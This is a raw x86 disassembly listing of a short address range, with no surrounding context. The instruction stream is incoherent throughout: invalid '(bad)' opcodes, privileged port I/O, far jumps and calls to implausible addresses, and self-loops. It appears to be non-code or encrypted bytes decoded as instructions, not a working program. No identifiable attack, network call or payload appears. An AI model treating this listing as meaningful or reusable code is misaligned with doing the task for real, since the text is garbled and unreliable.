  410453:	(bad)  
  410454:	adc    eax,0x3008bb3
  410459:	xchg   edi,eax
  41045a:	mov    ah,bl
  41045c:	in     al,0x5e
  41045e:	mov    bl,0x1d
  410460:	leave  
  410461:	ins    BYTE PTR es:[edi],dx
  410462:	out    0x35,al
  410464:	push   ebx
  410465:	int3   
  410466:	std    
  410467:	sbb    ecx,edx
  410469:	fs ja  0x4104e1
  41046c:	jg     0x4104de
  41046e:	aas    
  41046f:	add    BYTE PTR [edx+0x158efdc3],bh
  410475:	psllw  mm5,QWORD PTR [ebx-0x11]
  410479:	jmp    0x41040e
  41047b:	pop    ebx
  41047c:	add    ecx,DWORD PTR [edx+edx*8+0x7d0ea043]
  410483:	icebp  
  410484:	call   0xa631cd29
  410489:	mov    esi,0xbd0aaabc
  41048e:	mov    ch,0x64
  410490:	std    
  410491:	ds scas al,BYTE PTR es:[edi]
  410493:	or     al,0x26
  410495:	shl    BYTE PTR [edx-0x43e9b26f],cl
  41049b:	jno    0x410518
  41049d:	repnz imul esi,DWORD PTR [ebx],0xd37fb739
  4104a4:	fadd   QWORD PTR [ebp+edx*8-0x741b0c7]
  4104ab:	pop    ebx
  4104ac:	call   0xf4d17bb5
  4104b1:	xor    DWORD PTR [eax],ebp
  4104b3:	ficomp DWORD PTR [edx-0x1e1431]
  4104b9:	les    ebx,FWORD PTR [ebx-0x6e527af7]
  4104bf:	scas   al,BYTE PTR es:[edi]
  4104c0:	pop    es
  4104c1:	push   0xffffff86
  4104c3:	or     DWORD PTR [ecx+0x62],edi
  4104c6:	or     ecx,DWORD PTR [esi+0x5c]
  4104c9:	mov    eax,ds:0x90ec2cf5
  4104ce:	(bad)  ss:[ebx]
  4104d1:	sub    bl,dl
  4104d3:	sar    BYTE PTR [ebx+ebx*8],cl
  4104d6:	mov    ah,0x3d
  4104d8:	or     eax,esp
  4104da:	pop    es
  4104db:	nop
  4104dc:	jmp    0x4104f8
  4104de:	or     BYTE PTR [ecx+ecx*4],al
  4104e1:	(bad)  
  4104e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4104e3:	(bad)  
  4104e4:	jg     0x410528
  4104e6:	cmp    al,0x9a
  4104e8:	sub    DWORD PTR [edi-0x486f7dbe],esp
  4104ee:	ss adc cl,ah
  4104f1:	and    BYTE PTR [esi-0x3c091df0],0x33
  4104f8:	jecxz  0x41051d
  4104fa:	cli    
  4104fb:	mov    dh,ch
  4104fd:	add    ebp,DWORD PTR [esi+0x52b90850]
  410503:	add    ebx,DWORD PTR [esi]
  410505:	sar    BYTE PTR [edi+0x71],0x29
  410509:	xor    ah,dh
  41050b:	xchg   DWORD PTR [ebp+0x63],esp
  41050e:	sub    bl,BYTE PTR [esi]
  410510:	pushf  
  410511:	(bad)  
  410512:	mov    ch,0xd2
  410514:	adc    BYTE PTR [ebx-0x78cad6c8],bl
  41051a:	sbb    dh,BYTE PTR [ebp+0x215d4cd6]
  410520:	clc    
  410521:	or     eax,0x6b8c17ee
  410526:	jle    0x4104e6
  410528:	lock ficomp DWORD PTR [eax+0x59]
  41052c:	int3   
  41052d:	ja     0x410590
  41052f:	sub    BYTE PTR [edi],0xce
  410532:	and    esi,ebp
  410534:	push   eax
  410535:	out    0x30,eax
  410537:	bound  ebx,QWORD PTR [ebx-0x6355294f]
  41053d:	(bad)  
  41053f:	icebp  
  410540:	inc    ebp
  410541:	bound  edx,QWORD PTR [ecx+0x52]
  410544:	inc    ebp
  410545:	out    dx,al
  410546:	and    ebp,ecx
  410548:	ds jne 0x4105c4
  41054b:	mov    al,0xf3
  41054d:	out    0x43,al
  41054f:	js     0x41051b
  410551:	mov    edx,0x2f7c896e
  410556:	in     al,dx
  410557:	lods   eax,DWORD PTR ds:[esi]
  410558:	sbb    bh,BYTE PTR [esi+ebp*1-0x32]
  41055c:	jno    0x4104f0
  41055e:	and    al,0xe0
  410560:	add    eax,0xb210771
  410565:	add    DWORD PTR [edx-0x5d],ebp
  410568:	cmp    al,0xf
  41056a:	scas   eax,DWORD PTR es:[edi]
  41056b:	xlat   BYTE PTR ds:[ebx]
  41056c:	mov    edi,DWORD PTR [ebp-0x8]
  41056f:	mov    ebx,DWORD PTR [ebp-0x10]
  410572:	jmp    0x4107fa
  410577:	cmp    al,0xd6
  410579:	ret    0xdac3
  41057c:	fcmovnb st,st(1)
  41057e:	aad    0xe1
  410580:	pop    es
  410581:	adc    ah,BYTE PTR [ecx]
  410583:	mov    cl,0xf2
  410585:	enter  0x3981,0x53
  410589:	js     0x410603
  41058b:	in     eax,0x7e
  41058d:	js     0x410607
  41058f:	cs stc 
  410591:	retf   
  410592:	inc    ebx
  410593:	imul   edx,DWORD PTR [edx+eax*4],0xdb94c22e
  41059a:	fld    DWORD PTR [eax-0x74]
  41059d:	pop    ds
  41059e:	sar    BYTE PTR fs:[eax],0xcd
  4105a2:	jp     0x41057c
  4105a4:	mov    dl,0xd8
  4105a6:	and    ch,0xc5
  4105a9:	jle    0x410608
  4105ab:	popa   
  4105ac:	jp     0x41059e
  4105ae:	cdq    
  4105af:	das    
  4105b0:	fiadd  WORD PTR [edx+ebx*1]
  4105b3:	rol    DWORD PTR [esi+0x15ba403f],0x13
  4105ba:	out    dx,al
  4105bb:	je     0x410620
  4105bd:	loope  0x410568
  4105bf:	jnp    0x41056b
  4105c1:	mov    bh,0xb4
  4105c3:	out    0x5e,eax
  4105c5:	jle    0x410614
  4105c7:	dec    esp
  4105c8:	or     dl,BYTE PTR [edi+0x37c33b3c]
  4105ce:	adc    esp,DWORD PTR [esp+edx*1-0x258f60dd]
  4105d5:	add    DWORD PTR [edi+ebp*4-0x70201ec1],eax
  4105dc:	jno    0x41064d
  4105de:	or     eax,0xadfc8bc4
  4105e3:	loope  0x4105dd
  4105e5:	xchg   esi,eax
  4105e6:	idiv   DWORD PTR fs:[ebx-0x7ce947a4]
  4105ed:	or     bl,BYTE PTR [esp+edx*1-0xb7b3001]
  4105f4:	jmp    0x410648
  4105f6:	add    BYTE PTR [edx],0x1f
  4105f9:	jp     0x4105da
  4105fb:	jg     0x4105b6
  4105fd:	push   ebx
  4105fe:	xor    bl,dl
  410600:	in     eax,0x63
  410602:	stos   DWORD PTR es:[edi],eax
  410603:	out    dx,al
  410604:	aam    0x48
  410606:	push   esp
  410607:	sbb    BYTE PTR [edi+0x67],dl
  41060a:	mov    edx,0x737a3c1a
  41060f:	pushf  
  410610:	call   0xf08b:0x10b375e7
  410617:	pop    ecx
  410618:	shr    ah,1
  41061a:	push   ecx
  41061b:	push   0x5d
  41061d:	push   esp
  41061e:	(bad)  
  41061f:	shl    BYTE PTR [ebx-0x1c],0xf1
  410623:	dec    ebx
  410624:	sbb    BYTE PTR [edi+0x495c8af3],cl
  41062a:	pop    edi
  41062b:	les    edx,FWORD PTR [edx-0x5004dcbc]
  410631:	cmp    DWORD PTR [edx-0xd],0xbcabcd3f
  410638:	mov    eax,ds:0x404394bf
  41063d:	jmp    0xd37b:0xa74cbc2f
  410644:	es or  eax,0xff4e2bc1
  41064a:	lock add al,0x66
  41064d:	aam    0x35
  41064f:	test   bh,bh
  410651:	and    BYTE PTR [ebp-0x1e734dc8],cl
  410657:	imul   DWORD PTR [esi+0x54]
  41065a:	mov    esp,0x3054abd7
  41065f:	ret    
  410660:	mov    dl,0x84
  410662:	aam    0xbc
  410664:	mov    ebx,0x449076b3
  410669:	sar    DWORD PTR [edi+0x5f277c76],cl
  41066f:	hlt    
  410670:	retf   
  410671:	or     BYTE PTR [esi],0x78
  410674:	or     esp,DWORD PTR ds:0xd3863a4
  41067a:	jno    0x4106bd
  41067c:	mov    esp,0x6d28800e
  410681:	clc    
  410682:	or     eax,0x1961df3f
  410687:	daa    
  410688:	sub    DWORD PTR [esi-0x70],ecx
  41068b:	stc    
  41068c:	cli    
  41068d:	xchg   ebx,eax
  41068e:	xchg   esi,eax
  41068f:	push   ebp
  410690:	std    
  410691:	addr16 mov dh,0x7c
  410694:	inc    edx
  410695:	cmp    al,0xcd
  410697:	les    edi,FWORD PTR ds:0x6e7c55a1
  41069d:	imul   ebp,DWORD PTR [edx],0x25
  4106a0:	push   ebx
  4106a1:	out    dx,al
  4106a2:	shl    edi,cl
  4106a4:	into   
  4106a5:	cwde   
  4106a6:	loop   0x410713
  4106a8:	cmp    DWORD PTR [esi],ebx
  4106aa:	das    
  4106ab:	dec    edx
  4106ac:	(bad)  
  4106ad:	in     al,dx
  4106ae:	mov    ds:0x88eebd7d,eax
  4106b3:	into   
  4106b4:	cld    
  4106b5:	push   ebp
  4106b6:	ja     0x410728
  4106b8:	add    dl,ah
  4106ba:	pop    ds
  4106bb:	inc    ebx
  4106bc:	mov    dh,0x6d
  4106be:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4106bf:	sub    al,0xfe
  4106c1:	add    eax,0xbe3df264
  4106c6:	and    al,bl
  4106c8:	lods   al,BYTE PTR ds:[esi]
  4106c9:	clc    
  4106ca:	dec    edi
  4106cb:	dec    ebp
  4106cc:	iret   
  4106cd:	loop   0x4106df
  4106cf:	mov    DWORD PTR [edi+0x139cdd5],edx
  4106d5:	and    al,0x5d
  4106d7:	push   ebx
  4106d8:	dec    ebx
  4106d9:	rol    DWORD PTR [edi],0xbd
  4106dc:	ds dec edi
  4106de:	xor    ah,cl
  4106e0:	popa   
  4106e1:	jle    0x4106e1
  4106e3:	stos   DWORD PTR es:[edi],eax
  4106e4:	and    ecx,ecx
  4106e6:	popf   
  4106e7:	or     ebx,DWORD PTR ds:0xc49310ac
  4106ed:	ds arpl bp,di
  4106f0:	(bad)  
  4106f1:	call   0x9b7a2022
  4106f6:	loop   0x41075f
  4106f8:	dec    ecx
  4106f9:	fwait
  4106fa:	jb     0x410723
  4106fc:	loop   0x41069b
  4106fe:	inc    esi
  4106ff:	mov    ch,cl
  410701:	inc    ebx
  410702:	(bad)  
  410703:	sub    al,0xe7
  410705:	adc    BYTE PTR [ebx+0x22],ch
  410708:	int3   
  410709:	aam    0x87
  41070b:	test   eax,0x4635ae4f
  410710:	or     edi,DWORD PTR [ebx+0x4b00d9e6]
  410716:	xchg   esi,eax
  410717:	adc    esp,DWORD PTR [ebx]
  410719:	gs lock jae 0x41074b
  41071d:	and    DWORD PTR [ecx],ecx
  41071f:	not    BYTE PTR [ebx+0x50]
  410722:	jo     0x4106e5
  410724:	mov    ecx,0xdb68960d
  410729:	mov    edx,0xb61a2e2f
  41072e:	mov    esi,DWORD PTR [esi-0x2b71a892]
  410734:	fimul  DWORD PTR [ebp-0x24]
  410737:	jg     0x410787
  410739:	add    eax,0x51983d76
  41073e:	or     al,BYTE PTR [eax]
  410740:	xchg   ecx,eax
  410741:	ja     0x41078e
  410743:	xlat   BYTE PTR ds:[ebx]
  410744:	sbb    DWORD PTR [esi],eax
  410746:	sub    ebx,eax
  410748:	mov    al,0xa6
  41074a:	push   0x71edbb0d
  41074f:	scas   eax,DWORD PTR es:[edi]
  410750:	sbb    ch,bl
  410752:	or     al,0x8a
  410754:	jne    0x41076b
  410756:	jge    0x41077a
  410758:	inc    ebx
  410759:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41075a:	fidivr DWORD PTR ss:[ebx]
  41075d:	jecxz  0x410787
  41075f:	ins    DWORD PTR es:[edi],dx
  410760:	push   es
  410761:	jae    0x41079b
  410763:	dec    eax
  410764:	xor    edx,esi
  410766:	push   cs
  410767:	dec    edi
  410768:	and    cl,BYTE PTR [ecx-0x50]
  41076b:	not    cl
  41076d:	cmc    
  41076e:	mov    cl,0x5d
  410770:	out    0x3d,eax
  410772:	ins    DWORD PTR es:[edi],dx
  410773:	into   
  410774:	and    ah,ah
  410776:	test   al,0xe3
  410778:	clc    
  410779:	sbb    eax,0x2b8470c6
  41077e:	sub    DWORD PTR [ebp-0x1a],edx
  410781:	sub    eax,0xe13f9aa5
  410786:	xacquire xchg DWORD PTR [edi],ecx
  410789:	sub    DWORD PTR [ebp-0x59],0xa09a7b45
  410790:	arpl   WORD PTR [ebx-0x7a],sp
  410793:	shr    BYTE PTR [edx],cl
  410795:	or     al,0xab
  410797:	div    DWORD PTR [ebx]
  410799:	dec    ebx
  41079a:	lahf   
  41079b:	sub    ebp,DWORD PTR [edx+0x3]
  41079e:	jo     0x410726
  4107a0:	add    DWORD PTR [ebx],ecx
  4107a2:	aam    0x27
  4107a4:	adc    DWORD PTR [ebx-0x4f5165c5],0x937db5a4
  4107ae:	lods   eax,DWORD PTR ds:[esi]
  4107af:	inc    eax
  4107b0:	std    
  4107b1:	push   esi
  4107b2:	sub    DWORD PTR [ebx],edi
  4107b4:	ins    BYTE PTR es:[edi],dx
  4107b5:	dec    ecx
  4107b6:	fsub   DWORD PTR [ecx+0x54d70660]
  4107bc:	call   0xbfefaeab
  4107c1:	jo     0x41081b
  4107c3:	repnz mov edi,0xd1e41025
  4107c9:	out    dx,al
  4107ca:	xchg   esp,eax
  4107cb:	pop    esi
  4107cc:	push   cs
  4107cd:	cmp    ebp,DWORD PTR [edi]
  4107cf:	(bad)  
  4107d0:	xchg   ecx,eax
  4107d1:	xlat   BYTE PTR ds:[ebx]
  4107d2:	xor    eax,0x48c8afaa
  4107d7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4107d8:	stos   BYTE PTR es:[edi],al
  4107d9:	leave  
  4107da:	div    DWORD PTR [bx+si-0x69f6]
  4107df:	dec    edx
  4107e0:	mov    BYTE PTR [ecx-0x74af2367],0x48
  4107e7:	mov    esp,0x9d3cf6cc
  4107ec:	js     0x41082e
  4107ee:	out    dx,al
  4107ef:	icebp  
  4107f0:	adc    DWORD PTR [eax+ecx*2],edx
  4107f3:	icebp  
  4107f4:	stos   BYTE PTR es:[edi],al
  4107f5:	xchg   esp,eax
  4107f6:	sub    eax,0x2b42f9d1
  4107fb:	fistp  QWORD PTR [ebx]
  4107fd:	fucompp 
  4107ff:	add    DWORD PTR [edx],0x0
  410802:	add    dh,cl
  410804:	ror    ebx,0xc8
  410807:	fcmovnbe st,st(6)
  410809:	fld    st(1)
  41080b:	ud0    edi,esp
  41080e:	pop    ds
  41080f:	and    esi,DWORD PTR [ebp+0x54]
  410812:	cmps   BYTE PTR cs:[esi],BYTE PTR es:[edi]
  410814:	push   ecx
  410815:	js     0x41088f
  410817:	in     eax,0x7e
  410819:	js     0x410893
  41081b:	fbstp  TBYTE PTR [eax]
  41081d:	sar    DWORD PTR [esi-0x4b5fac1],0x1d
  410824:	in     eax,dx
  410825:	call   0x514049f4
  41082a:	jmp    0x496ae92a
  41082f:	test   DWORD PTR [eax+0x7a],edx
  410832:	retf   0x4d08
  410835:	sub    DWORD PTR [esi],ecx
  410837:	bound  edi,QWORD PTR [eax-0x41]
  41083a:	sbb    bh,ch
  41083c:	push   esp
  41083d:	out    dx,al
  41083e:	iret   
  41083f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410840:	ja     0x41084a
  410842:	rol    WORD PTR [ebx],cl
  410845:	xchg   ebp,eax
  410846:	ficom  DWORD PTR [edi+edx*2+0x7dde95]
  41084d:	xchg   ebx,eax
  41084e:	inc    esp
  41084f:	xor    ah,dl
  410851:	cmp    al,0x8
  410853:	jg     0x4108a2
  410855:	mov    WORD PTR [edi-0x666ee9f0],?
  41085b:	push   0xffffffbe
  41085d:	je     0x41085d
  41085f:	nop
  410860:	push   es
  410861:	inc    ebx
  410862:	or     eax,0xba433b
  410867:	adc    edx,DWORD PTR [edi-0x2d]
  41086a:	jae    0x410837
  41086c:	out    dx,al
  41086d:	and    al,0x43
  41086f:	iret   
  410870:	adc    edi,edx
  410872:	fistp  WORD PTR [ebp-0x4]
  410875:	enter  0x6f54,0x58
  410879:	mov    ds:0x96f18572,eax
  41087e:	ins    BYTE PTR es:[edi],dx
  41087f:	icebp  
  410880:	lods   eax,DWORD PTR ds:[esi]
  410881:	add    al,al
  410883:	xor    ecx,DWORD PTR [eax-0x69dd9fd6]
  410889:	mov    bl,0x2c
  41088b:	div    DWORD PTR [edx]
  41088d:	add    ebp,esi
  41088f:	mov    ebp,0x6411b5d8
  410894:	mov    ch,0x8d
  410896:	mov    WORD PTR [edi-0x77049341],fs
  41089c:	lods   al,BYTE PTR ds:[esi]
  41089d:	sub    al,0x56
  41089f:	outs   dx,DWORD PTR ds:[esi]
  4108a0:	adc    eax,0xf9e2c557
  4108a5:	jl     0x4108ce
  4108a7:	mov    esp,0xc7763a78
  4108ac:	fnstsw WORD PTR [edx+0x53]
  4108af:	inc    ebx
  4108b0:	mov    esi,0xa762f283
  4108b5:	scas   eax,DWORD PTR es:[edi]
  4108b6:	sub    al,0x31
  4108b8:	push   0x62
  4108ba:	sub    dl,0xbd
  4108bd:	jg     0x410906
  4108bf:	xchg   esp,eax
  4108c0:	and    cl,BYTE PTR [eax+eax*8]
  4108c3:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4108c4:	xchg   cl,cl
  4108c6:	xchg   ecx,eax
  4108c7:	mov    ch,0x45
  4108c9:	xor    ebx,DWORD PTR [ebp-0x42287d9f]
  4108cf:	jmp    0xe657:0xe2a6243a
  4108d6:	test   DWORD PTR [eax],0x243e9a7d
  4108dc:	daa    
  4108dd:	stc    
  4108de:	frstor [esp+esi*2+0x366a3569]
  4108e5:	dec    esi
  4108e6:	jbe    0x4108f9
  4108e8:	iret   
  4108e9:	(bad)  
  4108ea:	jl     0x410909
  4108ec:	lods   eax,DWORD PTR ds:[esi]
  4108ed:	jg     0x410939
  4108ef:	pop    esi
  4108f0:	out    0xd4,eax
  4108f2:	loopne 0x41089e
  4108f4:	aas    
  4108f5:	jbe    0x41090f
  4108f7:	pop    ds
  4108f8:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4108f9:	jbe    0x41092f
  4108fb:	add    DWORD PTR [ebp+0x14ea02b5],0x86101ec5
  410905:	add    ebx,0x1cdd3e4
  41090b:	nop
  41090c:	(bad)  
  41090d:	jns    0x4108bf
  41090f:	into   
  410910:	dec    eax
  410911:	test   eax,0x6b13109b
  410917:	cli    
  410918:	mov    bh,0x43
  41091a:	mov    ecx,0x342e736e
  41091f:	mov    ds:0x806dfb84,al
  410924:	pop    esp
  410925:	cdq    
  410926:	popf   
  410927:	je     0x4108b4
  410929:	mov    ds:0x44b60106,eax
  41092e:	xor    bh,BYTE PTR [ebp+0x16]
  410931:	out    0xa5,eax
  410933:	lea    ebp,[ebx+ebx*4]
  410936:	xchg   edi,eax
  410937:	fwait
  410938:	mov    bh,0xc3
  41093a:	mov    esp,DWORD PTR [ecx+ebp*4-0x19]
  41093e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41093f:	test   BYTE PTR [edx],ch
  410941:	or     eax,0xa787d70
  410946:	mov    bl,0x5f
  410948:	push   ebp
  410949:	fild   WORD PTR [ebp-0x60875871]
  41094f:	pusha  
  410950:	adc    al,0x2e
  410952:	pop    esi
  410953:	mov    DWORD PTR [edx-0x4da7b69e],esi
  410959:	retf   0x2433
  41095c:	ret    
  41095d:	popf   
  41095e:	(bad)  
  41095f:	jl     0x410985
  410961:	dec    ebx
  410962:	daa    
  410963:	aas    
  410964:	shr    DWORD PTR [ebx],0x83
  410967:	add    BYTE PTR ss:[edx],cl
  41096a:	lahf   
  41096b:	xor    DWORD PTR [ebx],edi
  41096d:	mov    bl,0x47
  41096f:	xor    BYTE PTR [edi+0x3eb5f358],dl
  410975:	test   DWORD PTR [eax+ebx*4-0x3252cf6b],ecx
  41097c:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  41097d:	lock popf 
  41097f:	pop    esp
  410980:	out    0xee,al
  410982:	loop   0x4109df
  410984:	test   DWORD PTR [eax+0x12],edx
  410987:	ret    0xbaa3
  41098a:	mov    WORD PTR [edi+0x7d3efabf],gs
  410990:	popf   
  410991:	inc    ebp
  410992:	sbb    BYTE PTR [edx],cl
  410994:	retf   
  410995:	or     al,0xf3
  410997:	mov    al,ds:0x4eb17f20
  41099c:	shr    DWORD PTR [ebx-0x6e8479e5],cl
  4109a2:	xor    cl,bl
  4109a4:	ins    DWORD PTR es:[edi],dx
  4109a5:	int3   
  4109a6:	sbb    DWORD PTR [edi+0x26cdd4e0],esi
  4109ac:	cld    
  4109ad:	adc    BYTE PTR [esi-0xbefab04],0x15
  4109b4:	cdq    
  4109b5:	push   ebp
  4109b6:	push   esp
  4109b7:	fcmovne st,st(0)
  4109b9:	mov    DWORD PTR [ebx+0x21],0xf578f0e9
  4109c0:	inc    ebp
  4109c1:	mov    al,0x5
  4109c3:	int    0xae
  4109c5:	fimul  DWORD PTR [edi+0x56]
  4109c8:	mov    esp,0x7c2b4592
  4109cd:	je     0x4109a9
  4109cf:	xchg   ebx,eax
  4109d0:	loope  0x4109b0
  4109d2:	rol    DWORD PTR [ebx+0x7b],1
  4109d5:	icebp  
  4109d6:	and    DWORD PTR [edx+ecx*1-0x6f],0x76
  4109db:	and    al,BYTE PTR [ecx-0x80]
  4109de:	loop   0x41098e
  4109e0:	pop    ss
  4109e1:	rol    DWORD PTR [ecx+eax*2],cl
  4109e4:	les    edi,FWORD PTR [edx+0x56]
  4109e7:	pop    eax
  4109e8:	and    al,0x79
  4109ea:	mov    ch,0x2f
  4109ec:	push   esi
  4109ed:	dec    dx
  4109ef:	pop    ecx
  4109f0:	mov    ch,0xe8
  4109f2:	push   ebp
  4109f3:	fs push eax
  4109f5:	ret    
  4109f6:	ss jg  0x410a47
  4109f9:	popa   
  4109fa:	(bad)  
  4109fb:	retf   
  4109fc:	loopne 0x4109f4
  4109fe:	call   0xf458fe3c
  410a03:	mov    ds:0xa58ee95a,al
  410a08:	pop    esp
  410a09:	mov    DWORD PTR [ebp-0x52c41adb],edx
  410a0f:	repnz movs DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410a11:	pushf  
  410a12:	sbb    eax,DWORD PTR [edx+0x42f3b155]
  410a18:	jb     0x4109ce
  410a1a:	and    esp,DWORD PTR es:0x2defa2c7
  410a21:	pushf  
  410a22:	repnz lock push ebp
  410a25:	xchg   ecx,eax
  410a26:	call   0xb810c3f1
  410a2b:	mov    DWORD PTR [edi-0x6e],ebx
  410a2e:	iret   
  410a2f:	xbegin 0xb5104c38
  410a35:	ins    BYTE PTR es:[edi],dx
  410a36:	ja     0x4109d7
  410a38:	fld    DWORD PTR [eax-0x36]
  410a3b:	(bad)  
  410a3c:	adc    BYTE PTR [ecx],al
  410a3e:	fs and al,0x78
  410a41:	pop    es
  410a42:	fsub   st,st(0)
  410a44:	sub    al,BYTE PTR [ebx+edx*8]
  410a47:	push   0x349cef34
  410a4c:	push   ebx
  410a4d:	mov    ch,0xd3
  410a4f:	sbb    eax,0x28d2301a
  410a54:	repz popa 
  410a56:	push   eax
  410a57:	push   esi
  410a58:	out    dx,al
  410a59:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  410a5a:	js     0x410a36
  410a5c:	daa    
  410a5d:	ret    0x3708
  410a60:	push   cs
  410a61:	popa   
  410a62:	and    BYTE PTR [ebx+0x62001155],bh
  410a68:	cld    
  410a69:	jne    0x410a0b
  410a6b:	out    0x56,al
  410a6d:	out    dx,al
  410a6e:	adc    eax,0xd457f856
  410a73:	popf   
  410a74:	push   edi
  410a75:	inc    esi
  410a76:	int    0xdc
  410a78:	fidiv  DWORD PTR [edi+0x7e67b5e6]
  410a7e:	pop    ebx
  410a7f:	xchg   edi,eax
  410a80:	lahf   
  410a81:	push   ecx
  410a82:	ja     0x410a71
  410a84:	das    
  410a85:	fisttp DWORD PTR [edi]
  410a87:	xchg   DWORD PTR [eax],ecx
  410a89:	add    BYTE PTR [eax],al
  410a8b:	add    BYTE PTR [ebx-0x1d1627ab],cl
  410a91:	adc    al,0x0
  410a93:	add    BYTE PTR [ebx+0x7d8bd055],cl
  410a99:	cld    
  410a9a:	xor    edx,eax
  410a9c:	xor    edi,eax
  410a9e:	jmp    0x410d26
  410aa3:	aas    
  410aa4:	retf   
  410aa5:	iret   
  410aa6:	(bad)
  410aa9:	aad    0xc9
  410aab:	jo     0x410a57
  410aad:	lods   eax,DWORD PTR ds:[esi]
  410aae:	not    DWORD PTR [ecx+esi*2+0x56135702]
  410ab5:	js     0x410b2f
  410ab7:	in     eax,0x7e
  410ab9:	js     0x410b33
  410abb:	test   DWORD PTR [ebx],0xe1f9780e
  410ac1:	push   edx
  410ac2:	rcr    DWORD PTR [eax-0x74b24140],0x85
  410ac9:	loop   0x410abc
  410acb:	jecxz  0x410af9
  410acd:	cmp    BYTE PTR [ebp+0x7c8be3c],dl
  410ad3:	test   DWORD PTR [edx+edi*2],0x6dba3166
  410ada:	xchg   ecx,eax
  410adb:	push   ebp
  410adc:	int3   
  410add:	jo     0x410ad9
  410adf:	jp     0x410aed
  410ae1:	in     eax,0x47
  410ae3:	cmp    BYTE PTR [ecx+ebp*4+0x23e92d75],dh
  410aea:	mov    bl,0x8e
  410aec:	inc    ebx
  410aed:	push   ebx
  410aee:	sbb    esp,DWORD PTR [ebx]
  410af0:	xor    eax,0xbe5a0a97
  410af5:	sbb    DWORD PTR [ecx],ecx
  410af7:	lds    ebx,FWORD PTR [edx+0x6]
  410afa:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  410afb:	out    0x9a,eax
  410afd:	ds sbb al,0x7f
  410b00:	cld    
  410b01:	dec    edi
  410b02:	jno    0x410b36
  410b04:	mov    edx,0x4733c0b3
  410b09:	mov    cl,0xc5
  410b0b:	mov    esi,0xcc776ccc
  410b10:	push   es
  410b11:	loope  0x410a99
  410b13:	data16 stos BYTE PTR es:[edi],al
  410b15:	push   ss
  410b16:	push   esi
  410b17:	in     al,0x78
  410b19:	ds jge 0x410b60
  410b1c:	dec    esp
  410b1d:	call   0x8a66:0x582c952d
  410b24:	adc    eax,0x10c8a7c9
  410b29:	fisubr DWORD PTR [ecx-0x5ba661be]
  410b2f:	ret    
  410b30:	adc    dh,BYTE PTR [edx]
  410b32:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b33:	xlat   BYTE PTR ds:[ebx]
  410b34:	inc    edx
  410b35:	push   ecx
  410b36:	xchg   BYTE PTR [edx],bl
  410b38:	xor    al,0x6b
  410b3a:	pop    eax
  410b3b:	jecxz  0x410bb4
  410b3d:	mov    esi,0x46d818a1
  410b42:	lds    edi,FWORD PTR [edx]
  410b44:	mov    dh,0x2f
  410b46:	inc    ecx
  410b47:	xlat   BYTE PTR ds:[ebx]
  410b48:	push   ecx
  410b49:	enter  0xf2db,0x44
  410b4d:	jns    0x410b4e
  410b4f:	mov    ecx,0xaec25dee
  410b54:	and    cl,BYTE PTR [edx+0x6a13c3e2]
  410b5a:	shr    DWORD PTR [ebp+esi*4+0x4b628801],0x7b
  410b62:	pusha  
  410b63:	mov    ah,0x48
  410b65:	push   ebp
  410b66:	push   ds
  410b67:	dec    eax
  410b68:	jbe    0x410b41
  410b6a:	outs   dx,DWORD PTR ds:[esi]
  410b6b:	rcr    BYTE PTR [eax-0x70cd9962],cl
  410b71:	jle    0x410b6b
  410b73:	add    al,BYTE PTR [edx+0x79]
  410b76:	in     al,0xa6
  410b78:	rol    dl,cl
  410b7a:	jmp    0xbc739b7f
  410b7f:	sbb    BYTE PTR [eax+edx*4+0x44],0x36
  410b84:	pop    ds
  410b85:	dec    ebx
  410b86:	lods   eax,DWORD PTR ds:[esi]
  410b87:	fcom   DWORD PTR [ecx+eiz*8+0x305acc62]
  410b8e:	adc    ch,BYTE PTR [eax+eiz*4+0x38]
  410b92:	fwait
  410b93:	dec    ebx
  410b94:	push   ecx
  410b95:	lods   al,BYTE PTR ds:[esi]
  410b96:	call   DWORD PTR [ebx-0x25]
  410b99:	add    ch,BYTE PTR [edi+0x37]
  410b9c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  410b9d:	stos   BYTE PTR es:[edi],al
  410b9e:	imul   esp,DWORD PTR [eax],0xffffffcb
  410ba1:	test   ah,0x3f
  410ba4:	and    bl,BYTE PTR [ebp-0x78]
  410ba7:	mov    ds:0x34319550,al
  410bac:	sub    DWORD PTR [edx+0x5b],ebx
  410baf:	dec    esi
  410bb0:	sub    BYTE PTR [esi+0x60],0x8e
  410bb4:	pop    ecx
  410bb5:	jge    0x410b84
  410bb7:	pop    esi
  410bb8:	test   BYTE PTR [ebp-0x6a],bh
  410bbb:	pusha  
  410bbc:	pop    esi
  410bbd:	pop    edx
  410bbe:	in     eax,dx
  410bbf:	fisubr DWORD PTR [esi-0x5d]
  410bc2:	bound  ebx,QWORD PTR [edi+0x5a86ee95]
  410bc8:	jle    0x410c20
  410bca:	cmp    ebx,DWORD PTR [edx-0x65]
  410bcd:	cmc    
  410bce:	sti    
  410bcf:	jmp    0x410bcf
  410bd1:	daa    
  410bd2:	ss pop eax
  410bd4:	(bad)  
  410bd5:	jbe    0x410b70
  410bd7:	cmp    al,0xab
  410bd9:	sbb    al,0x28
  410bdb:	arpl   WORD PTR ds:0x3e79eb0,bp
  410be1:	addr16 xchg esi,eax
  410be3:	sti    
  410be4:	lea    ecx,[ecx]
  410be6:	add    ebx,0xffffff94
  410be9:	loope  0x410c32
  410beb:	mov    bl,0x4c
  410bed:	push   0xffffff94
  410bef:	inc    ecx
  410bf0:	pop    edi
  410bf1:	xor    bh,BYTE PTR [ebp-0x77]
  410bf4:	js     0x410bc8
  410bf6:	sbb    eax,0xf290cf44
  410bfb:	ja     0x410ba4
  410bfd:	pop    ebp
  410bfe:	punpckhbw mm7,QWORD PTR [ebx-0x1f]
  410c02:	push   ecx
  410c03:	loopne 0x410b9c
  410c05:	xor    al,0x10
  410c07:	add    eax,0x42719892
  410c0c:	repz loope 0x410c53
  410c0f:	jnp    0x410c36
